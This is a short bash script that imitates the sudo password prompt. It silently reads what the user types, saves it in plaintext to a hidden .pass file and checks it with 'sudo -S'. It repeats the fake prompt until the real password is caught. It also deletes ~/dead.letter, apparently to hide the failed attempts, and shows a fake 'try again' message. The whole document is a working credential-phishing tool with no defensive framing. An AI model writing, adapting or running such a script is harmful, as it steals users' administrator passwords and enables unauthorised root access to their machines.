#!/bin/bash
i=5
while [ $i -ne 0 ]
do
printf "[sudo] password for $USER:" && read -s tati
 echo "" && echo $tati > .pass
sudo -k -S ls < .pass > wastage.txt 2>&1
i=$?
if [ $i -ne 0 ]
then
sleep 1
if [ -f ~/dead.letter ]
then 
rm ~/dead.letter
fi
echo "[sudo], try again."
fi
rm wastage.txt
done
